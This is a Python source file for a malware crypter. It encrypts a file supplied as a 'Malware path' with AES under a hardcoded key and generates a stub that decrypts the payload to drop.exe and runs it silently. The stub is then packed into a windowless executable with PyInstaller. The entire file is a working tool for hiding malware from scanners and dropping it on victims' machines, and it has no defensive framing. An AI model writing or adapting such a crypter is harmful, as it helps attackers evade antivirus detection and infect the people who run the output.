import pyaes
import os
import sys

file_name1 = sys.argv[1]  # Malware path
new_file_name = 'drop.exe'
file_name = open(file_name1, 'rb')
file_data = file_name.read()
file_name.close()

# crypt file data
key = 'YiPQwiRn3tqwB7ss'
aes = pyaes.AESModeOfOperationCTR(key.encode())
crypto_data = aes.encrypt(file_data)

# decrypt file data
aes = pyaes.AESModeOfOperationCTR(key.encode())
decrypt_data = aes.decrypt(crypto_data)

# Create Stub in Python File
stub = "import pyaes\n"
stub += "import subprocess\n\n"
stub += "crypto_data_hex = {} {}".format(crypto_data, '\n')
stub += "key = \"" + key + "\"\n"
stub += "new_file_name = \"" + new_file_name + "\"\n\n"
stub += '''
# decrypt file data
aes = pyaes.AESModeOfOperationCTR(key.encode())
decrypt_data = aes.decrypt(crypto_data_hex)

# save file
new_file = open(new_file_name, 'wb')
new_file.write(decrypt_data)
new_file.close()

# Execute file
proc = subprocess.Popen(new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
'''

# Save the Stub
stub_name = "stub_teste.py"
stub_file = open(stub_name, "w")
stub_file.write(stub)
stub_file.close()

# Convert py to exe with pyinstaller
os.system("pyinstaller -F -w --clean " + stub_name)
